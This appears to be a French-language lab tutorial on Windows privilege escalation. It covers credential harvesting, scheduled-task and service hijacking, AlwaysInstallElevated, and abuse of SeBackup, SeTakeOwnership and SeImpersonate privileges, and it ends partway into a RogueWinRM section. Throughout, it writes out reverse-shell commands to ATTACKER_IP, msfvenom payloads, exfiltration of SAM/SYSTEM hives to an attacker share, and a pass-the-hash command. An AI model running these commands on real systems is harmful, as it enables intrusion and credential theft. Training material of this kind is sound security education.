# Montée en privilège dans Windows

## Retrouver des mots de passe

### Unattended installation

Lors de l'installation de Windows sur un grand nombre d'hôtes, les administrateurs peuvent utiliser les services de déploiement Windows, qui permettent de déployer une seule image de système d'exploitation sur plusieurs hôtes via le réseau. Ce type d'installation est appelé installation sans surveillance, car elle ne nécessite pas d'interaction de la part de l'utilisateur. Ces installations nécessitent l'utilisation d'un compte administrateur pour effectuer la configuration initiale, qui peut être stockée sur la machine dans les emplacements suivants :

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

Au sein de ces fichiers on devrait y retrouver des mots de passe en clair.

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Historique powershell

Chaque fois qu'un utilisateur exécute une commande à l'aide de Powershell, celle-ci est stockée dans un fichier qui garde en mémoire les commandes passées. Cette fonction est utile pour répéter rapidement des commandes que vous avez déjà utilisées. Si un utilisateur exécute une commande qui inclut un mot de passe directement dans la ligne de commande Powershell, il peut le récupérer ultérieurement en utilisant la commande suivante à partir d'une invite `cmd.exe` :
    
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Remarque : la commande ci-dessus ne fonctionnera qu'à partir de cmd.exe, car Powershell ne reconnaît pas `%userprofile%` comme une variable d'environnement. Pour lire le fichier à partir de Powershell, vous devez remplacer `%userprofile%` par `$Env:userprofile`.

### Mots de passe sauvegardés

Windows nous permet d'utiliser les informations d'identification d'autres utilisateurs. Cette fonction permet également d'enregistrer ces informations d'identification sur le système. La commande ci-dessous permet d'obtenir la liste des informations d'identification enregistrées :

```powershell
cmdkey /list
```

Bien que vous ne puissiez pas voir les mots de passe réels, si vous remarquez des informations d'identification qui valent la peine d'être essayées, vous pouvez les utiliser avec la commande runas et l'option /savecred, comme indiqué ci-dessous.

```powershell
runas /savecred /user:admin cmd.exe
```

Cette action va permettre de se connecter sur la session de l'utilisateur admin sans avoir à rentrer le mot de passe.

### l'Internet Information Services (IIS)

Internet Information Services (IIS) est le serveur web par défaut des installations Windows. La configuration des sites web sur IIS est stockée dans un fichier appelé web.config et peut contenir des mots de passe pour les bases de données ou les mécanismes d'authentification configurés. En fonction de la version installée d'IIS, le fichier web.config se trouve dans l'un des emplacements suivants :
* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Voici un moyen rapide de trouver les chaînes de connexion à la base de données dans le fichier :

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Récupérer les mdps d'un logiciel : PuTTY

PuTTY est un client SSH que l'on trouve couramment sur les systèmes Windows. Au lieu d'avoir à spécifier les paramètres d'une connexion à chaque fois, les utilisateurs peuvent stocker des sessions où l'IP, l'utilisateur et d'autres configurations peuvent être stockés pour une utilisation ultérieure. PuTTY ne permet pas aux utilisateurs de stocker leur mot de passe SSH, mais il stocke les configurations de proxy qui incluent des informations d'authentification en texte clair.

Pour récupérer les informations d'identification du proxy stockées, vous pouvez rechercher ProxyPassword dans la clé de registre suivante à l'aide de la commande suivante :

```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
Note : Simon Tatham est le créateur de PuTTY (et son nom fait partie du chemin), pas le nom d'utilisateur pour lequel nous récupérons le mot de passe. Le nom d'utilisateur du proxy stocké devrait également être visible après l'exécution de la commande ci-dessus.

Tout comme putty stocke les informations d'identification, tout logiciel qui stocke des mots de passe, y compris les navigateurs, les clients de messagerie, les clients FTP, les clients SSH, les logiciels VNC et autres, disposera de méthodes pour récupérer les mots de passe que l'utilisateur a sauvegardés.

## Tâches programmées

En examinant les tâches planifiées sur le système cible, vous pouvez voir une tâche planifiée qui a perdu son binaire ou qui utilise un binaire que vous pouvez modifier.

Les tâches planifiées peuvent être listées à partir de la ligne de commande en utilisant la commande `schtasks` sans aucune option. Pour obtenir des informations détaillées sur l'un des services, vous pouvez utiliser une commande telle que la suivante :

```powershell
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Vous obtiendrez de nombreuses informations sur la tâche, mais ce qui nous importe est le paramètre "Tâche à exécuter" qui indique ce qui sera exécuté par la tâche planifiée, et le paramètre "Exécuter en tant qu'utilisateur", qui indique l'utilisateur qui sera utilisé pour exécuter la tâche.

Si notre utilisateur actuel peut modifier ou écraser l'exécutable "Task to Run", nous pouvons contrôler ce qui est exécuté par l'utilisateur taskusr1, ce qui entraîne une simple escalade des privilèges. Pour vérifier les permissions sur l'exécutable, nous utilisons `icacls` :

```powershell
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```
Comme on peut le voir dans le résultat, le groupe `BUILTIN\Users` a un accès complet (F) au binaire de la tâche. Cela signifie que nous pouvons modifier le fichier **.bat** et insérer n'importe quelle charge utile. Pour plus de commodité, `nc64.exe` se trouve dans `C:\tools`. Modifions le fichier bat pour lancer un shell inversé :

```powershell
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Nous démarrons ensuite un listener sur la machine de l'attaquant sur le même port que celui que nous avons indiqué dans notre reverse shell :

```bash
nc -lvnp 4444
```

Lors de la prochaine exécution de la tâche planifiée, vous devriez recevoir le reverse shell avec les privilèges taskusr1. Dans un scénario réel, il faut alors attendre patiemment que la tâche se déclenche.

Dans un CTF, il est possible que pour gagner du temps, ils aient donné les droits d'exécution à la tâche planifiée. Dans ce cas, il suffit de l'exécuter manuellement pour obtenir un shell :

```powershell
schtasks /run /tn vulntask
```

## Les fichiers "AlwaysInstallElevated"

Les fichiers d'installation Windows (également connus sous le nom de fichiers .msi) sont utilisés pour installer des applications sur le système. Ils s'exécutent généralement avec le niveau de privilège de l'utilisateur qui les lance. Cependant, ils peuvent être configurés pour s'exécuter avec des privilèges plus élevés à partir de n'importe quel compte d'utilisateur (même ceux qui ne sont pas privilégiés). Cela pourrait nous permettre de générer un fichier MSI malveillant qui s'exécuterait avec des privilèges d'administrateur.

Cette méthode nécessite la définition de deux valeurs de registre. Vous pouvez les interroger à partir de la ligne de commande en utilisant les commandes ci-dessous.

```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Pour pouvoir exploiter cette vulnérabilité, les deux doivent être activés. Dans le cas contraire, l'exploitation ne sera pas possible. Si elles sont activées, vous pouvez générer un fichier .msi malveillant à l'aide de msfvenom, comme indiqué ci-dessous :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.154.220 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Comme il s'agit d'un shell inversé, vous devez également exécuter le module Metasploit Handler configuré en conséquence. Une fois que vous avez transféré le fichier que vous avez créé, vous pouvez exécuter l'installateur avec la commande ci-dessous et recevoir le reverse shell :

```powershell
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Exploiter les mauvaises configurations des services

Les services Windows sont gérés par le Service Control Manager (SCM). Le SCM est un processus chargé de gérer l'état des services en fonction des besoins, de vérifier l'état actuel d'un service donné et, d'une manière générale, de fournir un moyen de configurer les services.

Chaque service sur une machine Windows aura un exécutable associé qui sera exécuté par le SCM chaque fois qu'un service est démarré. Il est important de noter que les exécutables de service mettent en œuvre des fonctions spéciales pour pouvoir communiquer avec le SCM et que, par conséquent, n'importe quel exécutable ne peut pas être démarré en tant que service avec succès. Chaque service spécifie également le compte d'utilisateur sous lequel le service sera exécuté.

Pour mieux comprendre la structure d'un service, vérifions la configuration du service apphostsvc avec la commande `sc qc` :

```powershell
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
Ici, nous pouvons voir que l'exécutable associé est spécifié par le paramètre BINARY_PATH_NAME, et que le compte utilisé pour exécuter le service est indiqué dans le paramètre SERVICE_START_NAME.

Les services ont une liste de contrôle d'accès discrétionnaire (DACL), qui indique qui a le droit de démarrer, d'arrêter, de mettre en pause, d'interroger l'état, d'interroger la configuration ou de reconfigurer le service, entre autres privilèges. La DACL peut être consultée dans Process Hacker (disponible sur le bureau de votre machine).

Toutes les configurations des services sont stockées dans le registre sous `HKLM\SYSTEM\CurrentControlSet\Services\`.

Il existe une sous-clé pour chaque service du système. Là encore, nous pouvons voir l'exécutable associé dans la valeur **ImagePath** et le compte utilisé pour démarrer le service dans la valeur **ObjectName**. Si un DACL a été configuré pour le service, il sera stocké dans une sous-clé appelée **Security**. Seuls les administrateurs peuvent modifier ces entrées de registre par défaut.

### Permissions non sécurisées sur un exécutable de service

Si l'exécutable associé à un service a des permissions faibles qui permettent à un attaquant de le modifier ou de le remplacer, l'attaquant peut obtenir les privilèges du compte du service de manière triviale.

Pour comprendre comment cela fonctionne, examinons une vulnérabilité trouvée sur Splinterware System Scheduler. Pour commencer, nous allons interroger la configuration du service en utilisant `sc` :

```powershell
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Nous pouvons voir que le service installé par le logiciel vulnérable s'exécute sous le nom de svcuser1 et que l'exécutable associé au service se trouve dans `C:\Progra~2\System~1\WService.exe`. Nous vérifions ensuite les permissions sur l'exécutable :

```powershell
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Et là, nous avons quelque chose d'intéressant. Le groupe Everyone a des permissions de modification (M) sur l'exécutable du service. Cela signifie que nous pouvons simplement l'écraser avec n'importe quelle charge utile de notre choix, et le service l'exécutera avec les privilèges du compte d'utilisateur configuré.

Générons une charge utile exe-service à l'aide de msfvenom et servons-la via un serveur web python :

```bash
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Nous pouvons ensuite extraire la charge utile à partir de Powershell avec la commande suivante :

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Une fois que la charge utile se trouve dans le serveur Windows, nous remplaçons l'exécutable du service par notre charge utile. Comme nous avons besoin d'un autre utilisateur pour exécuter notre charge utile, nous devons également accorder toutes les autorisations au groupe Tout le monde :

```cmd
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Nous lançons une écoute inversée sur la machine de l'attaquant :

```bash
nc -lvnp 4445
```
Enfin, redémarrez le service. Alors que dans un scénario normal, vous devriez attendre le redémarrage du service, on vous a attribué des privilèges pour redémarrer le service vous-même afin de vous faire gagner du temps. Utilisez les commandes suivantes à partir d'une invite de commande cmd.exe :

```cmd
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```


Remarque : PowerShell utilise `sc` comme alias de `Set-Content`, vous devez donc utiliser `sc.exe` pour contrôler les services avec PowerShell de cette manière.

### Chemins de service mal formatés (Unquotted Service Paths)

#### Explication

Lorsque nous ne pouvons plus écrire directement dans les exécutables des services comme auparavant, il est encore possible de forcer un service à exécuter des exécutables arbitraires en utilisant une fonctionnalité plutôt obscure.

Lorsque l'on travaille avec des services Windows, un comportement très particulier se produit lorsque le service est configuré pour pointer vers un exécutable "non quoté". Par "non quoté", nous entendons que le chemin de l'exécutable associé n'est pas correctement quoté pour tenir compte des espaces dans la commande.

À titre d'exemple, examinons la différence entre deux services. Le premier service utilisera une citation correcte afin que le SCM sache sans aucun doute qu'il doit exécuter le fichier binaire pointé par `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, suivi des paramètres donnés :

```cmd
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

N'oubliez pas : PowerShell a `sc` comme alias de `Set-Content`, vous devez donc utiliser `sc.exe` pour contrôler les services si vous êtes dans une invite PowerShell.

Examinons maintenant un autre service qui n'est pas correctement cité :

```cmd

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

Lorsque le SCM tente d'exécuter le binaire associé, un problème se pose. Comme le nom du dossier "Disk Sorter Enterprise" comporte des espaces, la commande devient ambiguë et le SCM ne sait pas lequel des éléments suivants vous essayez d'exécuter :

Commande | Argument 1 | Argument 2
--- | --- | ---
C:\MyPrograms\Disk.exe | Sorter | Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe | (aucun)
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe | (aucun) | (aucun)

Cela est lié à la manière dont l'invite de commande analyse une commande. En général, lorsque vous envoyez une commande, les espaces sont utilisés comme séparateurs d'arguments, à moins qu'ils ne fassent partie d'une chaîne entre guillemets. Cela signifie que la "bonne" interprétation de la commande non citée serait d'exécuter `C:\\MyPrograms\\Disk.exe` et de prendre le reste comme arguments.

Au lieu d'échouer comme il devrait probablement le faire, SCM tente d'aider l'utilisateur et commence à rechercher chacun des binaires dans l'ordre indiqué dans le tableau :

1. Tout d'abord, il recherche `C:\\MyPrograms\\Disk.exe`. S'il existe, le service exécutera cet exécutable.
2. Si ce dernier n'existe pas, il recherchera alors `C:\\MyPrograms\\Disk` Sorter.exe. S'il existe, le service exécutera cet exécutable.
3. Si ce dernier n'existe pas, il recherchera alors `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. Cette option devrait réussir et sera généralement exécutée dans une installation par défaut.

À partir de ce comportement, le problème devient évident. Si un attaquant crée l'un des exécutables recherchés avant l'exécutable de service attendu, il peut forcer le service à exécuter un exécutable arbitraire.

Bien que cela semble trivial, la plupart des exécutables de service seront installés par défaut sous `C:\Program Files` ou `C:\Program Files (x86)`, qui **n'est pas accessible en écriture par les utilisateurs non privilégiés**. Cela empêche tout service vulnérable d'être exploité. Il existe des exceptions à cette règle : 
* Certains programmes d'installation modifient les permissions sur les dossiers installés, ce qui rend les services vulnérables. 
* Un administrateur peut décider d'installer les binaires du service dans un chemin autre que celui par défaut. Si ce chemin est inscriptible par le monde, la vulnérabilité peut être exploitée.

#### Exploitation

Dans notre cas, l'administrateur a installé les binaires de la trieuse de disques sous `c:\MyPrograms`. Par défaut, ce répertoire hérite des permissions du répertoire `C:\ ce qui permet à n'importe quel utilisateur d'y créer des fichiers et des dossiers. Nous pouvons le vérifier à l'aide d'`icacls` :

```command prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Le groupe `BUILTIN\\Users` dispose des privilèges **AD** et **WD**, ce qui permet à l'utilisateur de créer des sous-répertoires et des fichiers, respectivement.

Le processus de création d'une charge utile exe-service avec `msfvenom` et son transfert vers l'hôte cible est **le même que précédemment**, alors n'hésitez pas à créer la charge utile suivante et à l'envoyer sur le serveur comme précédemment. Il faut également démarrer un listener pour recevoir le reverse shell lorsqu'il sera exécuté.

```cmd
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```

Une fois que la charge utile est dans le serveur, déplacez-la vers l'un des emplacements où le détournement pourrait se produire. Dans ce cas, nous déplacerons notre charge utile vers `C:\MyPrograms\Disk.exe`. Nous accorderons également à chacun toutes les permissions sur le fichier afin de nous assurer qu'il peut être exécuté par le service :

```command prompt
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Une fois le service redémarré, votre charge utile devrait s'exécuter :
    
```command prompt
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
``` 
En conséquence, vous obtiendrez un shell inversé avec les privilèges svcusr2.

### Permissions de service non sécurisées

Vous pouvez encore avoir une petite chance de profiter d'un service si le DACL exécutable du service est bien configuré, et si le chemin binaire du service est correctement cité. Si la DACL du service (et non la DACL de l'exécutable du service) vous permet de modifier la configuration d'un service, vous pourrez reconfigurer le service. Cela vous permettra de pointer vers n'importe quel exécutable dont vous avez besoin et de l'exécuter avec le compte de votre choix, y compris le compte SYSTEM lui-même.

Pour vérifier la présence d'une DACL de service à partir de la ligne de commande, vous pouvez utiliser Accesschk de la suite Sysinternals. Pour votre commodité, une copie est disponible dans `C:\\tools`. La commande pour vérifier la DACL du service thmservice est la suivante :

```command prompt
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Nous voyons ici que le groupe `BUILTIN\\Users` a la permission SERVICE_ALL_ACCESS, ce qui signifie que n'importe quel utilisateur peut reconfigurer le service.

Avant de modifier le service, construisons un autre exe-service reverse shell et démarrons un listener pour celui-ci sur la machine de l'attaquant :

```cmd 
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```

Nous allons ensuite transférer l'exécutable du reverse shell sur la machine cible et le stocker dans `C:\Usersthm-unpriv\rev-svc3.exe`. N'hésitez pas à utiliser wget pour transférer votre exécutable et le déplacer à l'emplacement souhaité. **N'oubliez pas d'accorder les permissions à Tout le monde** pour exécuter votre charge utile :

```Command Prompt
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Pour modifier l'exécutable et le compte associés au service, nous pouvons utiliser la commande suivante (attention aux espaces après les signes égaux lors de l'utilisation de sc.exe) :

```command prompt
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notez que vous pouvez utiliser n'importe quel compte pour exécuter le service. Nous avons choisi LocalSystem car c'est le compte le plus privilégié disponible. Pour déclencher notre charge utile, il suffit de redémarrer le service :

```command prompt
C:\> sc stop THMService
C:\> sc start THMService
```
Et nous recevrons un shell sur la machine de notre attaquant avec les privilèges SYSTEM !

## Exploiter des privilèges mal configurés

Chaque utilisateur dispose d'un ensemble de privilèges qui peuvent être vérifiés à l'aide de la commande suivante :

```powershell
whoami /priv
```

Une liste complète des privilèges disponibles sur les systèmes Windows est disponible [ici](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Du point de vue d'un attaquant, seuls les privilèges permettant une escalade dans le système sont intéressants. Vous trouverez une liste complète des privilèges exploitables sur le projet [Priv2Admin Github](https://github.com/gtworek/Priv2Admin).

Nous n'examinerons pas chacun d'entre eux, mais nous montrerons comment abuser de certains des privilèges les plus courants.

### SeBackup / SeRestore

Les privilèges SeBackup et SeRestore permettent aux utilisateurs de lire et d'écrire dans n'importe quel fichier du système, en ignorant toute DACL en place. L'idée derrière ce privilège est de permettre à certains utilisateurs d'effectuer des sauvegardes à partir d'un système sans avoir besoin de privilèges administratifs complets.

Avec ce pouvoir, un attaquant peut trivialement escalader les privilèges sur le système en utilisant de nombreuses techniques. Celle que nous allons étudier consiste à copier les ruches de registre SAM et SYSTEM pour extraire le hachage du mot de passe de l'administrateur local.

Si on arrive à avoir accès à un compte "Backup Administrator", on aura d'office accès à ces privilèges. Il faudra lancer une invite de commande en mode administrateur.

Pour récupérer les fichiers de hash SAM et SYSTEM on peut faire les commandes suivantes :

```command prompt
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

Cela créera quelques fichiers avec le contenu des ruches du registre. Nous pouvons maintenant copier ces fichiers sur notre machine attaquante en utilisant SMB ou toute autre méthode disponible. Pour SMB, nous pouvons utiliser impacket's smbserver.py pour démarrer un simple serveur SMB avec un partage réseau dans le répertoire courant de notre machine attaquante.

```bash
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username [Username] -password [password] public share
```
Cela créera un partage nommé public pointant vers le répertoire de partage, qui nécessite le nom d'utilisateur et le mot de passe de notre session Windows actuelle. Après cela, nous pouvons utiliser la commande copy dans notre machine Windows pour transférer les deux fichiers vers notre machine d'attaque.

```command prompt
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
On a plus qu'à utiliser  `impacket` pour récupérer les hachages des mots de passe des utilisateurs :

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
Nous pouvons enfin utiliser le hachage de l'administrateur pour effectuer une attaque de type "Pass-the-Hash" et accéder à la machine cible avec les privilèges SYSTEM.

```bash
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.2.123
```

### SeTakeOwnership

Le privilège SeTakeOwnership permet à un utilisateur de prendre possession de n'importe quel objet du système, y compris les fichiers et les clés de registre, ce qui offre à un attaquant de nombreuses possibilités d'élever ses privilèges, car nous pourrions, par exemple, rechercher un service fonctionnant en tant que SYSTEM et prendre possession de l'exécutable du service. Pour cette tâche, nous prendrons cependant un chemin différent.

Si on est un utilisateur qui a le privilège SeTakeOwnership, on peut l'activer en ouvrant un cmd en tant qu'administrateur.

Cette fois-ci, nous allons utiliser `utilman.exe` pour escalader les privilèges.**Utilman** est une application Windows intégrée utilisée pour fournir des options de facilité d'accès pendant l'écran de verrouillage :

Comme Utilman est exécuté avec les privilèges SYSTEM, nous obtiendrons effectivement les privilèges SYSTEM si nous remplaçons le binaire original par n'importe quelle charge utile. Comme nous pouvons prendre la propriété de n'importe quel fichier, le remplacer est trivial.

Pour remplacer utilman, nous commencerons par en prendre possession avec la commande suivante :

```command prompt
takeown /f C:\Windows\System32\Utilman.exe
```

Notez que le fait d'être le propriétaire d'un fichier ne signifie pas nécessairement que vous avez des privilèges sur ce fichier, mais qu'en tant que propriétaire, vous pouvez vous attribuer tous les privilèges dont vous avez besoin. Pour donner à votre utilisateur toutes les permissions sur utilman.exe, vous pouvez utiliser la commande suivante :

```command prompt
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
Ensuite, nous remplacerons utilman.exe par une copie de cmd.exe :

```command prompt
copy cmd.exe utilman.exe
```

Pour déclencher utilman, nous allons verrouiller notre écran à l'aide du bouton de démarrage. Enfin, cliquez sur le bouton "Facilité d'accès", qui exécute utilman.exe avec les privilèges SYSTEM. Comme nous l'avons remplacé par une copie de cmd.exe, nous obtiendrons une invite de commande avec les privilèges SYSTEM !

### SeImpersonate / SeAssignPrimaryToken

#### Explications

Ces privilèges permettent à un processus d'usurper l'identité d'autres utilisateurs et d'agir en leur nom. L'usurpation d'identité consiste généralement à pouvoir lancer un processus ou un thread dans le contexte de sécurité d'un autre utilisateur.

L'usurpation d'identité se comprend facilement si l'on pense au fonctionnement d'un serveur FTP. Le serveur FTP doit restreindre l'accès des utilisateurs aux seuls fichiers qu'ils sont autorisés à voir.

Supposons que nous ayons un service FTP fonctionnant avec l'utilisateur ftp. Sans l'usurpation d'identité, si l'utilisateur Ann se connecte au serveur FTP et tente d'accéder à ses fichiers, le **service FTP essaiera d'y accéder avec son jeton d'accès** plutôt qu'avec celui d'Ann.

Il y a plusieurs raisons pour lesquelles **l'utilisation du jeton ftp** n'est pas la meilleure idée :

* Pour que les fichiers soient servis correctement, ils doivent être accessibles à l'utilisateur ftp. Dans l'exemple ci-dessus, le service FTP pourrait accéder aux fichiers d'Ann, mais pas à ceux de Bill, car le DACL des fichiers de Bill n'autorise pas l'utilisateur ftp. Cette situation est d'autant plus complexe que nous devons configurer manuellement des autorisations spécifiques pour chaque fichier/répertoire desservi. 
* Pour le système d'exploitation, tous les fichiers sont accessibles par ftp utilisateur, quel que soit l'utilisateur connecté au service FTP. Il est donc impossible de déléguer l'autorisation au système d'exploitation ; c'est donc le service FTP qui doit la mettre en œuvre. 
* Si le service FTP était compromis à un moment donné, l'attaquant aurait immédiatement accès à tous les dossiers auxquels l'utilisateur ftp a accès.

En revanche, si l'utilisateur du service **FTP dispose des privilèges SeImpersonate ou SeAssignPrimaryToken**, tout cela est un peu simplifié, car **le service FTP peut temporairement s'emparer du jeton d'accès de l'utilisateur** qui se connecte et l'utiliser pour effectuer n'importe quelle tâche en son nom (y compris l'accès aux fichiers).

Si l'utilisateur Ann se connecte au service FTP et si l'utilisateur FTP dispose de privilèges d'usurpation d'identité, il peut emprunter le jeton d'accès d'Ann et l'utiliser pour accéder à ses fichiers. De cette manière, **les fichiers n'ont pas besoin de fournir un accès à l'utilisateur FTP de quelque manière que ce soit**, et le système d'exploitation se charge de l'autorisation. Puisque le service FTP se fait passer pour Ann, **il ne pourra pas accéder aux fichiers de Jude ou de Bill** au cours de cette session.

En tant qu'attaquants, si nous parvenons à prendre le contrôle d'un processus avec les privilèges SeImpersonate ou SeAssignPrimaryToken, nous pouvons nous faire passer pour n'importe quel utilisateur se connectant et s'authentifiant à ce processus.

Dans les systèmes Windows, vous constaterez que les comptes LOCAL SERVICE et NETWORK SERVICE disposent déjà de tels privilèges. Étant donné que ces comptes sont utilisés pour lancer des services utilisant des comptes restreints, il est logique de leur permettre d'usurper l'identité des utilisateurs qui se connectent si le service en a besoin. Internet Information Services (IIS) crée également un compte par défaut similaire appelé "iis apppool\defaultapppool" pour les applications web.

Pour élever les privilèges à l'aide de ces comptes, un attaquant doit disposer des éléments suivants :
1. Créer un processus afin que les utilisateurs puissent s'y connecter et s'authentifier pour que l'usurpation d'identité puisse se produire. 
2. Trouver un moyen de forcer les utilisateurs privilégiés à se connecter et à s'authentifier auprès du processus malveillant créé.

Nous utiliserons l'exploit RogueWinRM pour remplir ces deux conditions.

#### Exploitation

**Commençons par supposer que nous avons déjà compromis un site web fonctionnant sur IIS et que nous avons installé un shell web.**

Nous pouvons utiliser l'interpréteur de commandes Web pour vérifier les privilèges attribués au compte compromis et confirmer que nous détenons les deux privilèges qui nous intéressent pour cette tâche.

Pour utiliser RogueWinRM, nous devons d'abord télécharger l'exploit sur la machine cible. 

